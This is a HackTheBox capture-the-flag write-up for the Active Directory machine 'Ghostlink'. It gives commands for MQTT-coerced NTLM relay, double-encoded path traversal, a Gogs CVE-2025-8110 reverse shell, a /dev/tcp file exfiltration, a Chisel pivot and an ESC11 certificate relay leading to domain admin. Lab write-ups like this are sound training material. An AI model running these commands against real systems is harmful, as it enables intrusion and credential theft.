# Ghostlink — HTB Write-up

**Author:** DonMorpheus (lab) + Ania  
**Machine:** Ghostlink (Hard, Windows / Active Directory)  
**Author of the box:** ctrlzero  
**Domain:** `ghostlink.htb`  
**DC:** `dc01.ghostlink.htb`  
**Scope:** HTB VPN / personal lab only  

> **No flags** and **no live passwords** in this document. Placeholders: `<TARGET_IP>`, `<TUN0_IP>`, `<PASS>`.

---

## TL;DR

| Phase | Vector |
|-------|--------|
| Recon | Classic DC ports **plus MQTT `:1883` anonymous**. IIS 80 is a landing page. Two vhosts behind ARR: file-share (NTLM) and Gogs. |
| Coerce | MQTT healthcheck JSON `telemetry.url` — publish retained payload pointing at Responder / ntlmrelayx. Account: `ghostlink\svc_canary`. Hash is NTLMv2; **do not crack**. |
| Auth app | HTTP NTLM relay to `gpz-op26-secure.ghostlink.htb`. IIS kernel auth → **ghostsurf `-k`**. SOCKS + Basic `GHOSTLINK/SVC_CANARY`. |
| Loot | `/api/download/` **double URL-encode** (`%252e%252e%255c`). `win.ini` proof → `NTUSER.DAT` → RecentDocs `db.zip` → KeePass (keyfile, empty master). |
| Foothold | Gogs **0.13.3** (asset hash `5084b4a9…`). **CVE-2025-8110**: symlink **`.git/config`** (relative), not Docker hook paths. Shell as **`git`**. |
| User | Steal `/opt/gogs/data/gogs.db` on a **different** TCP port than the reverse shell. Hashcat **10900**, rockyou trimmed to **≥20 chars** (KeePass recycle-bin policy). Linux user **`nvirelli`**. |
| DA | Internal CA `172.16.20.10` (`gpz-op26-secure`). **Chisel reverse SOCKS** (not ghostsurf). **ESC11** ICPR relay + coerce `DC01$` → DomainController PFX. **Clock skew ~8h**. WinRM Administrator. |

---

## 1. Recon

```bash
echo '<TARGET_IP> ghostlink.htb dc01.ghostlink.htb gpz-op26-secure.ghostlink.htb gpz-op26-toolkits.ghostlink.htb' | sudo tee -a /etc/hosts

nmap -Pn -sC -sV -p 53,80,88,135,139,389,445,464,593,636,1883,3268,3269,5985,9389 <TARGET_IP>
```

Read this as a **Domain Controller** (53/88/389/445/5985) plus two oddities:

- **HTTP 80** — IIS 10, title *Ghost Protocol Zero*, dead landing (`landing.mp4`).
- **MQTT 1883** — nmap already subscribes; payloads show `"username":"(null)"` → **anonymous broker**.

Host scripts: **SMB signing enabled and required**; **clock-skew ~8 hours**. Signing kills SMB relay to the DC. Skew kills Kerberos later (ESC11 `certipy auth`).

Same IP, three HTTP faces (`Host:` header / IIS ARR 3.0):

| Host | Result |
|------|--------|
| `ghostlink.htb` / `dc01` | Landing 200 |
| `gpz-op26-secure.ghostlink.htb` | **401 NTLM/Negotiate** — Windows file-share |
| `gpz-op26-toolkits.ghostlink.htb` | **Gogs** (`i_like_gogs` cookie). Register disabled |

Gogs version: `gogs.js?v=5084b4a9b77a506f5e287e82e945e1c6882b827a` → commit on GitHub → **0.13.3** → CVE-2025-8110 (**authenticated**). You cannot fire it yet.

Internal IPs show up later from MQTT: file-share `172.16.20.10`, Gogs `172.16.20.20`. Kali cannot route there without a pivot.

---

## 2. MQTT — what you are actually looking at

MQTT is a pub/sub bus. The broker is the mail room; **topics** are folder paths; you may **subscribe** (`#`) or **publish**.

```bash
# noise — broker talking about its own local mqttui clients
mosquitto_sub -h ghostlink.htb -p 1883 -t '$SYS/#' -v

# meat
mosquitto_sub -h ghostlink.htb -p 1883 -t 'GhostProtocolZero/systems/#' -v
```

`$SYS/... mqttui-… "IPv4":"127.0.0.1" "username":"(null)"` is **not** the target. It only proves anonymous login. Filter it.

Useful messages (JSON):

```text
.../domain/healthcheck       url: dc01.ghostlink.htb/...          ip: <TARGET_IP>
.../repository/healthcheck   url: gpz-op26-toolkits...            ip: 172.16.20.20
.../secureshare/healthcheck  url: gpz-op26-secure.../healthcheck  ip: 172.16.20.10
```

A Windows worker periodically **HTTP GETs** `telemetry.url`. If that URL is your `tun0`, the worker authenticates with **NTLM as `svc_canary`**. Port 1883 is the **remote control**; port 80/8888 on *you* is the **trap**.

```bash
./scripts/mqtt_set_healthcheck.sh <TUN0_IP> 8888
```

`-r` (retain) so the last message survives. Verify with `mosquitto_sub -C 1`.

---

## 3. NTLM capture, then relay (do not crack)

Responder on `tun0` (root) is enough to **see** the account:

```text
[HTTP] NTLMv2 Username : ghostlink\svc_canary
```

That string is challenge-response (hashcat 5600), not an NT hash and not a WinRM password. Official path: **HTTP relay** onto the 401 NTLM app.

Stop Responder (it holds :80). `impacket-ntlmrelayx` on current Kali **does not** take `--no-rdp-server` / `--no-mssql-server` (those flags are from another Impacket). Use what `--help` lists:

```bash
impacket-ntlmrelayx -t http://gpz-op26-secure.ghostlink.htb \
  --http-port 8888 \
  --no-smb-server --no-wcf-server --no-raw-server --no-rpc-server --no-winrm-server \
  --keep-relaying -socks
```

Republish MQTT so `url` includes **`:8888`** if you left 80. Success:

```text
SVC_CANARY ... SUCCEED
SOCKS: Adding HTTP://GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80)
```

Without `-socks`, ntlmrelayx dumps a single `GET /` HTML blob (`DEFAULT CASE`) and you cannot browse `/api/download/`.

**Empty `curl` through SOCKS:** ntlmrelayx HTTP plugin answers `401 Basic realm="ntlmrelayx - provide a DOMAIN/username"` with **zero body**. Always:

```bash
curl -sS -D - -x socks5h://127.0.0.1:1080 \
  -u 'GHOSTLINK/SVC_CANARY:' \
  http://gpz-op26-secure.ghostlink.htb/
```

Stock ntlmrelayx reuses a **dead IIS keep-alive** after the healthcheck `GET /` → IIS 401 NTLM again. Fix used in lab: **ghostsurf** with **`-k`** (kernel-mode / HTTP.sys probe) and **`-r`** (keep relaying):

```bash
./ghostsurf -t http://gpz-op26-secure.ghostlink.htb -k -r --http-port 8888 --no-smb-server
```

If you hit `'NTLMRelayxConfig' object has no attribute 'remove_target'`, set `self.remove_target = False` on that config class (one-line patch).

---

## 4. Double-encoded path traversal

The share encrypts **uploads**. Download is a path. Raw `..\` and single-encode → **403**. Double encode → **200**.

```bash
python3 scripts/encode_traversal.py '..\..\..\..\..\..\..\windows\win.ini'
```

```bash
curl -sS -D - -x socks5h://127.0.0.1:1080 -u 'GHOSTLINK/SVC_CANARY:' \
  'http://gpz-op26-secure.ghostlink.htb/api/download/%252e%252e%255c…windows%255cwin.ini'
```

Proof: `win.ini` text (`; for 16-bit app support`). `Content-Disposition: …win.ini.enc` is a label; content is plaintext.

Then hive of the **service account you relayed**:

```text
...\users\svc_canary\ntuser.dat
```

`file` → `MS Windows registry`. `regripper -r ntuser.dat -a` → **RecentDocs `.zip` = `db.zip`**.

`.lnk` under `AppData\Roaming\Microsoft\Windows\Recent\db.zip.lnk` → `strings` → full path, lab value:

```text
C:\Users\svc_canary\Documents\Operations\Management\db.zip
```

Zip contains `db.kdbx` + `.key.keyx`. KeePass: **empty master password**, keyfile only:

```bash
keepassxc-cli ls --no-password -k .key.keyx -R db.kdbx
keepassxc-cli show --no-password -k .key.keyx -s db.kdbx 'Toolkits Repository/Vesper Roth'
```

- **Canary Healthcheck** — MQTT nodes; creds marked migrated.  
- **Toolkits Repository** — Gogs people. The entry that still logs in is **Vesper Roth** (`vroth`).  
- **Recycle Bin / Domain Password Policy** — attachment: **minimum length 20** (used later to trim rockyou).

---

## 5. Gogs CVE-2025-8110

Authenticated PutContents does not resolve **symlinks**. Register is disabled; use `vroth` from KeePass.

**Wrong:** public PoCs that brute `/data/gogs/gogs-repositories/.../hooks/pre-receive` (Docker layouts). Clone+symlink succeeds; **PutContents HTTP 500**.

**Right:** relative symlink `malicious_link` → **`.git/config`**, then write a gitconfig whose `sshCommand` is a reverse shell. Script: [`scripts/gogs_cve_2025_8110_gitconfig.py`](scripts/gogs_cve_2025_8110_gitconfig.py).

```bash
nc -lvnp 4444
python3 scripts/gogs_cve_2025_8110_gitconfig.py \
  --url http://gpz-op26-toolkits.ghostlink.htb \
  --user vroth --password '<PASS>' \
  --lhost <TUN0_IP> --lport 4444
```

PUT often **read-timeouts** — that is the shell holding the request. Prompt: `git@gpz-op26-toolkits`. There is **no `python3`** on this image (`perl` / `script` / `busybox` / `ssh` exist). Do not expect `pty.spawn`.

`user.txt` is **not** in `git`’s home. `/home/nvirelli` is `750`; git cannot even `stat` the flag file.

---

## 6. `gogs.db` and `nvirelli`

Gogs passwords live in SQLite `/opt/gogs/data/gogs.db` (not `/etc/shadow`). If a Gogs admin is also a Linux user, hashes are worth cracking.

**Do not reuse the reverse-shell port for exfil.** Official writeup used **10001** for the shell and **4444** for the file. If your shell already sits on 4444, pick **5555**:

Kali:

```bash
nc -lvnp 5555 > gogs.db
```

Target (`git` session):

```bash
cat /opt/gogs/data/gogs.db > /dev/tcp/<TUN0_IP>/5555
```

`file` must say SQLite and size **≠ 0**. Redirecting `cat > /dev/tcp` onto the **same** connection as the reverse shell kills the TTY.

```bash
sqlite3 gogs.db 'SELECT name,salt,passwd FROM user;'
python3 scripts/gogs_hash_to_hashcat.py <SALT> <HEX>
# hashcat -a 0 -m 10900 hash.txt
grep -E '^.{20,}$' /usr/share/wordlists/rockyou.txt > trimmed.txt
```

PBKDF2-HMAC-SHA256, 10000 rounds, mode **10900**. Linux login: **`nvirelli`**.

### `su` on this reverse shell

`su nvirelli` + typed password **hangs** (no TTY).

`echo '<PASS>' | su -c 'exec bash -i' nvirelli` **looks** like it prints `exit` by itself: the pipe **EOF** after `echo`, interactive bash dies. That is not you typing exit.

Working patterns:

```bash
# one-shot
echo '<PASS>' | su -c 'cat /home/nvirelli/user.txt' nvirelli

# keep a shell (stdin stays open)
(echo '<PASS>'; cat) | su -c 'cd /home/nvirelli; exec bash -i' nvirelli
```

`ioctl` / `no job control` are cosmetic.

SSH from Kali to `:22` **times out** — the DC does not expose OpenSSH. sshd on toolkits (`22`/`2222`) is **internal only**. Stay on the reverse shell.

---

## 7. ESC11 → Domain Admin

`nvirelli` binds LDAP to the DC from Kali (templates enumerate). The CA is **`ghostlink-GPZ-OP26-SECURE-CA`** on **`gpz-op26-secure` = `172.16.20.10`**. Direct TCP to `.10` from Kali times out. DNS from the DC also returns the **internal** address if you pass `-ns <DC>` — do not let that override your pivot.

**Ghostsurf SOCKS is not a general TCP tunnel.** You need SOCKS **from the Linux box** (it can see `172.16.20.10`).

Chisel (already on Kali; copy the binary, do not apt extra tools):

```text
Kali:   chisel server -p 8001 --reverse
Target: ./chisel client <TUN0_IP>:8001 R:1081:socks
```

[`scripts/proxychains-pivot.conf`](scripts/proxychains-pivot.conf) → `socks5 127.0.0.1 1081`. Connect-scan / `nxc smb 172.16.20.10` through it: host `GPZ-OP26-SECURE`, **signing False**, `nvirelli` works.

ESC11: CA accepts **unencrypted ICPR**. Relay **machine account** NTLM to `rpc://172.16.20.10` and request template **DomainController**.

Relay **outbound** RPC goes through proxychains; **inbound** coerce hits Kali `:445` on `tun0` (DC can reach you — MQTT already proved that).

```bash
# terminal A (root — bind 445)
proxychains -f scripts/proxychains-pivot.conf -q \
  impacket-ntlmrelayx -t rpc://172.16.20.10 \
  -rpc-mode ICPR -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' \
  -smb2support --template DomainController --keep-relaying

# terminal B — no extra coercer package
nxc smb <TARGET_IP> -u nvirelli -p '<PASS>' -d ghostlink.htb \
  -M coerce_plus -o LISTENER=<TUN0_IP> ALWAYS=True
```

`DC01.pfx` drops in cwd. `certipy auth -pfx DC01.pfx` then:

```text
KRB_AP_ERR_SKEW  →  ntpdate -u <DC_IP>   # ~ +8 hours on this lab
```

Then TGT as `dc01$`, NT hash, `secretsdump -just-dc-user administrator`, `evil-winrm -H <NTHASH>`.

Reset Kali NTP when finished: `timedatectl set-ntp true`.

---

## Lab landmines (vs a clean PDF)

| What bit us | Why |
|-------------|-----|
| `$SYS` + `127.0.0.1` | Broker status, not healthcheck |
| MQTT `url` without `:8888` | Healthcheck still hits :80 after Responder is gone |
| `--no-rdp-server` | Not in Impacket 0.14 |
| Empty curl | Missing `-u 'GHOSTLINK/SVC_CANARY:'` and/or `-D -` |
| ntlmrelayx HTTP SOCKS | Dead keep-alive on HTTP.sys → ghostsurf `-k` |
| Generic CVE PoC | Wrong absolute hook paths, HTTP 500 |
| Exfil on 4444 | Shell already owns that port |
| `python3` on Gogs | Not installed |
| `su` + `echo \| bash -i` | Pipe EOF → fake `exit` |
| Clock | Kerberos after PFX |
| Ghostsurf vs Chisel | HTTP session hijack vs IP pivot to `.10` |

---

## Disclaimer

Educational write-up for a HackTheBox machine. Run the tooling only in scope you are allowed to test.
